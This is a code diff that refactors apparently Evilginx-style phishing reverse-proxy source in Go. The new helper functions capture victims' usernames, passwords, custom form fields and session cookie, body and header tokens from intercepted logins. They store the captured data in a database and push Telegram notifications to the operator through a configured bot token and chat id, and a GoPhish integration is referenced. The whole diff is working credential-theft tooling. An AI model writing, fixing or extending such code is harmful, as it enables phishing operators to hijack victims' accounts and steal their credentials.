@@ -690,7 +690,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				// check for creds in request body
-				trigger := 0
 				if pl != nil && ps.SessionId != "" {
 
 					req.Header.Set(p.getHomeDir(), o_host)
@@ -711,30 +710,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")
 
 						if json_re.MatchString(contentType) {
-							trigger = 0
-
 							if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(body))
 								if um != nil && len(um) > 1 {
-									p.setSessionUsername(ps.SessionId, um[1])
-									trigger = 1
-
-									log.Success("[%d] Username: [%s]", ps.Index, um[1])
-									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-										log.Error("database: %v", err)
-									}
+									p.captureUsername(ps.SessionId, ps.Index, um[1])
 								}
 							}
 
 							if pl.password.tp == "json" {
 								pm := pl.password.search.FindStringSubmatch(string(body))
 								if pm != nil && len(pm) > 1 {
-									p.setSessionPassword(ps.SessionId, pm[1])
-									trigger = 1
-									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-										log.Error("database: %v", err)
-									}
+									p.capturePassword(ps.SessionId, ps.Index, pm[1])
 								}
 							}
 
@@ -742,12 +728,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if cp.tp == "json" {
 									cm := cp.search.FindStringSubmatch(string(body))
 									if cm != nil && len(cm) > 1 {
-										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
-										trigger = 1
-										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
-										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
-											log.Error("database: %v", err)
-										}
+										p.captureCustom(ps.SessionId, ps.Index, cp.key_s, cm[1])
 									}
 								}
 							}
@@ -790,13 +771,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Debug("force_post: body: %s len:%d", body, len(body))
 								}
 							}
-							if trigger == 1 {
-								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
-							}
 
 						} else if form_re.MatchString(contentType) {
-							trigger = 0
-
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
 								log.Debug("POST: %s", req.URL.Path)
 
@@ -806,35 +782,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
 										um := pl.username.search.FindStringSubmatch(v[0])
 										if um != nil && len(um) > 1 {
-											p.setSessionUsername(ps.SessionId, um[1])
-											trigger = 1
-											log.Success("[%d] Username: [%s]", ps.Index, um[1])
-											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-												log.Error("database: %v", err)
-											}
+											p.captureUsername(ps.SessionId, ps.Index, um[1])
 										}
 									}
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
 										pm := pl.password.search.FindStringSubmatch(v[0])
 										if pm != nil && len(pm) > 1 {
-											p.setSessionPassword(ps.SessionId, pm[1])
-											trigger = 1
-											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-												log.Error("database: %v", err)
-											}
+											p.capturePassword(ps.SessionId, ps.Index, pm[1])
 										}
 									}
 									for _, cp := range pl.custom {
 										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
 											cm := cp.search.FindStringSubmatch(v[0])
 											if cm != nil && len(cm) > 1 {
-												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
-												trigger = 1
-												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
-												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
-													log.Error("database: %v", err)
-												}
+												p.captureCustom(ps.SessionId, ps.Index, cp.key_s, cm[1])
 											}
 										}
 									}
@@ -893,9 +854,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 
 							}
-							if trigger == 1 {
-								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
-							}
 
 						}
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -951,8 +909,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 			}
-
-			trigger := 0
 
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
@@ -1073,7 +1029,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								token_re := v.search.FindStringSubmatch(string(body))
 								if token_re != nil && len(token_re) >= 2 {
 									s.BodyTokens[k] = token_re[1]
-									trigger = 1
 								}
 							}
 						}
@@ -1085,7 +1040,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							hv := resp.Request.Header.Get(v.header)
 							if hv != "" {
 								s.HttpTokens[k] = hv
-								trigger = 1
 							}
 						}
 					}
@@ -1107,21 +1061,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			if pl != nil && ps.SessionId != "" {
+				if _, ok := p.sessions[ps.SessionId]; ok {
+					if err := p.syncSessionToDatabase(ps.SessionId); err != nil {
+						log.Error("database: %v", err)
+					}
+				}
+			}
+
 			if is_cookie_auth && is_body_auth && is_http_auth {
 				// we have all auth tokens
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					if !s.IsDone {
-						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-						trigger = 1
-
-						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
-							log.Error("database: %v", err)
-						}
-						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
-							log.Error("database: %v", err)
-						}
-						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
-							log.Error("database: %v", err)
+						if p.persistSessionTokensAndNotify(ps.SessionId, s) {
+							log.Success("[%d] all authorization tokens intercepted!", ps.Index)
 						}
 						s.Finish(false)
 
@@ -1249,20 +1202,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if ok && s.IsDone {
 					for _, au := range pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
-							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
-							if err != nil {
-								log.Error("database: %v", err)
-							}
-							err = p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens)
-							if err != nil {
-								log.Error("database: %v", err)
-							}
-							err = p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens)
-							if err != nil {
-								log.Error("database: %v", err)
-							}
-							if err == nil {
+							if p.persistSessionTokensAndNotify(ps.SessionId, s) {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+							} else {
+								log.Error("[%d] failed to persist tokens for authorization URL: %s", ps.Index, resp.Request.URL.Path)
 							}
 
 							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
@@ -1299,10 +1242,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-			}
-
-			if trigger == 1 {
-				readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
 			}
 
 			return resp
@@ -1729,12 +1668,119 @@ func (p *HttpProxy) setSessionTmsgid(sid string, tmsgid string) {
 		return
 	}
 	s, ok := p.sessions[sid]
-	log.Debug("ssssssssss%s", s)
-	log.Debug("ssssssssss%s", ok)
-
 	if ok {
 		s.SetTmsgid(tmsgid)
 	}
+}
+
+func (p *HttpProxy) notifyTelegramSession(sid string) {
+	NotifyTelegramSession(p.db, sid, p.cfg.general.Chatid, p.cfg.general.Teletoken)
+}
+
+// ensureDatabaseSession creates the DB row if the in-memory session exists but was never persisted.
+func (p *HttpProxy) ensureDatabaseSession(sid string) error {
+	_, err := p.db.GetSessionBySid(sid)
+	if err == nil {
+		return nil
+	}
+	s, ok := p.sessions[sid]
+	if !ok {
+		return fmt.Errorf("session not found: %s", sid)
+	}
+	if err := p.db.CreateSession(sid, s.Name, "", s.UserAgent, s.RemoteAddr); err != nil {
+		if _, getErr := p.db.GetSessionBySid(sid); getErr == nil {
+			return nil
+		}
+		return err
+	}
+	return nil
+}
+
+// syncSessionToDatabase writes the in-memory session state to the database.
+func (p *HttpProxy) syncSessionToDatabase(sid string) error {
+	if sid == "" {
+		return fmt.Errorf("empty session id")
+	}
+	s, ok := p.sessions[sid]
+	if !ok {
+		return fmt.Errorf("session not found: %s", sid)
+	}
+	if err := p.ensureDatabaseSession(sid); err != nil {
+		return err
+	}
+	if s.Username != "" {
+		if err := p.db.SetSessionUsername(sid, s.Username); err != nil {
+			return err
+		}
+	}
+	if s.Password != "" {
+		if err := p.db.SetSessionPassword(sid, s.Password); err != nil {
+			return err
+		}
+	}
+	for name, value := range s.Custom {
+		if err := p.db.SetSessionCustom(sid, name, value); err != nil {
+			return err
+		}
+	}
+	if len(s.CookieTokens) > 0 {
+		if err := p.db.SetSessionCookieTokens(sid, s.CookieTokens); err != nil {
+			return err
+		}
+	}
+	if len(s.BodyTokens) > 0 {
+		if err := p.db.SetSessionBodyTokens(sid, s.BodyTokens); err != nil {
+			return err
+		}
+	}
+	if len(s.HttpTokens) > 0 {
+		if err := p.db.SetSessionHttpTokens(sid, s.HttpTokens); err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
+func (p *HttpProxy) captureUsername(sid string, index int, username string) {
+	p.setSessionUsername(sid, username)
+	if err := p.syncSessionToDatabase(sid); err != nil {
+		log.Error("database: %v", err)
+		return
+	}
+	log.Success("[%d] Username: [%s]", index, username)
+	p.notifyTelegramSession(sid)
+}
+
+func (p *HttpProxy) capturePassword(sid string, index int, password string) {
+	p.setSessionPassword(sid, password)
+	if err := p.syncSessionToDatabase(sid); err != nil {
+		log.Error("database: %v", err)
+		return
+	}
+	log.Success("[%d] Password: [%s]", index, password)
+	p.notifyTelegramSession(sid)
+}
+
+func (p *HttpProxy) captureCustom(sid string, index int, key string, value string) {
+	p.setSessionCustom(sid, key, value)
+	if err := p.syncSessionToDatabase(sid); err != nil {
+		log.Error("database: %v", err)
+		return
+	}
+	log.Success("[%d] Custom: [%s] = [%s]", index, key, value)
+}
+
+// persistSessionTokensAndNotify writes captured tokens to the database and sends Telegram notification.
+func (p *HttpProxy) persistSessionTokensAndNotify(sid string, s *Session) bool {
+	if sid == "" || s == nil {
+		return false
+	}
+	if err := p.syncSessionToDatabase(sid); err != nil {
+		log.Error("database: %v", err)
+		return false
+	}
+	p.notifyTelegramSession(sid)
+	return true
 }
 
 func (p *HttpProxy) setSessionUsername(sid string, username string) {
